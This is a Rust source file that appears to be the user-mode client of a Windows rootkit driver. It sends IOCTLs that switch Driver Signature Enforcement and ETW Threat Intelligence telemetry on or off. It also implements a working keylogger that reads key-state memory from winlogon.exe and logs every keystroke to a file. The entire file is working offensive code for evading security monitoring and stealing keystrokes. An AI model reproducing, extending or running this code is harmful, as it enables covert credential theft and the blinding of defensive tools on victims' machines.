use std::{
    ffi::c_void,
    fs::OpenOptions,
    io::{BufWriter, Write},
    mem::size_of,
    ptr::null_mut,
    time::Duration,
};

use log::{info, error, debug};
use windows_sys::Win32::{
    Foundation::{
        CloseHandle, GetLastError, 
        HANDLE, INVALID_HANDLE_VALUE
    },
    System::{
        Diagnostics::Debug::ReadProcessMemory,
        Threading::{OpenProcess, PROCESS_ALL_ACCESS},
        IO::DeviceIoControl,
    },
};

use common::structs::{DSE, ETWTI};
use crate::utils::{
    get_process_by_name, 
    key_pressed, open_driver, 
    update_key_state, vk_to_char
};

/// Key states for keylogging functionality.
pub static mut KEY_STATE: [u8; 64] = [0; 64];
pub static mut KEY_PREVIOUS: [u8; 64] = [0; 64];
pub static mut KEY_RECENT: [u8; 64] = [0; 64];

/// Provides miscellaneous system functionalities through a driver interface, such as
/// Driver Signature Enforcement (DSE) toggling, ETWTI management, and keylogging.
pub struct Misc(HANDLE);

impl Misc {
    /// Creates a new `Misc` instance, opening a handle to the driver.
    ///
    /// # Returns
    ///
    /// * An instance of `Misc`.
    ///
    /// # Panics
    ///
    /// Panics if the driver cannot be opened.
    pub fn new() -> Self {
        let h_driver = open_driver().expect("Error");
        Self(h_driver)
    }

    /// Enables or disables Driver Signature Enforcement (DSE).
    ///
    /// # Arguments
    ///
    /// * `ioctl_code` - The IOCTL code for the DSE operation.
    /// * `enable` - `true` to enable DSE or `false` to disable it.
    pub fn dse(self, ioctl_code: u32, enable: bool) {
        debug!("Preparing DSE structure for {}", if enable { "enabling" } else { "disabling" });
        let mut info_dse = DSE { enable };

        debug!("Sending DeviceIoControl command to {} DSE", if enable { "enable" } else { "disable" });
        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.0,
                ioctl_code,
                &mut info_dse as *mut _ as *mut c_void,
                size_of::<DSE>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            error!("DeviceIoControl failed with status: 0x{:08X}", unsafe { GetLastError() });
        } else {
            info!("Driver Signature Enforcement (DSE) {}", if enable { "enable" } else { "disable" });
        }
    }

    /// Activates a keylogger that records keystrokes to a specified file.
    ///
    /// # Arguments
    ///
    /// * `ioctl_code` - The IOCTL code for initializing keylogging.
    /// * `file` - The path to the file where keystrokes will be recorded.
    pub fn keylogger(self, ioctl_code: u32, file: &String) {
        unsafe {
            let mut address = 0usize;
            let mut return_buffer = 0;
            let status = DeviceIoControl(
                self.0,
                ioctl_code,
                null_mut(),
                0,
                &mut address as *mut _ as *mut c_void,
                size_of::<usize>() as u32,
                &mut return_buffer,
                null_mut(),
            );

            if status == 0 {
                error!("DeviceIoControl Failed With Status: 0x{:08X}", GetLastError());
                return;
            }

            let pid = get_process_by_name("winlogon.exe").expect("Error retrieving pid from winlogon.exe");
            let h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
            if h_process == INVALID_HANDLE_VALUE {
                eprintln!("OpenProcess Failed With Error: {}", GetLastError());
                return;
            }

            let file = OpenOptions::new()
                .append(true)
                .create(true)
                .open(file)
                .expect("Failed to open or create keylog file");

            let mut writer = BufWriter::new(file);
            let mut bytes_read = 0;

            loop {
                core::ptr::copy_nonoverlapping(KEY_STATE.as_ptr(), KEY_PREVIOUS.as_mut_ptr(), 64);
                if ReadProcessMemory(
                    h_process,
                    address as *const c_void,
                    KEY_STATE.as_mut_ptr().cast(),
                    size_of::<[u8; 64]>() as usize,
                    &mut bytes_read,
                ) != 0
                {
                    update_key_state();

                    for i in 0..256 {
                        if key_pressed(i as u8) {
                            let key = vk_to_char(i as u8);
                            debug!("{key}");
                            writeln!(writer, "{}", key).expect("Failed to write to file");
                            writer.flush().expect("Failed to flush file buffer");
                        }
                    }
                } else {
                    eprintln!("Failed to read process memory");
                }

                std::thread::sleep(Duration::from_millis(50));
            }
        }
    }

    /// Enables or disables Event Tracing for Windows Threat Intelligence (ETWTI).
    ///
    /// # Arguments
    ///
    /// * `ioctl_code` - The IOCTL code for the ETWTI operation.
    /// * `enable` - `true` to enable ETWTI or `false` to disable it.
    pub fn etwti(self, ioctl_code: u32, enable: bool) {
        debug!("Preparing ETWTI structure for {}", if enable { "enabling" } else { "disabling" });
        let mut etwti = ETWTI { enable };

        debug!("Sending DeviceIoControl command to {} ETWTI", if enable { "enable" } else { "disable" });
        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.0,
                ioctl_code,
                &mut etwti as *mut _ as *mut c_void,
                std::mem::size_of::<ETWTI>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe { GetLastError() });
        } else {
            info!("ETWTI {}", if enable { "enable" } else { "disable" })
        }
    }
}

impl Drop for Misc {
    /// Ensures the driver handle is closed when `Misc` goes out of scope.
    fn drop(&mut self) {
        debug!("Closing the driver handle");
        unsafe { CloseHandle(self.0) };
    }
}
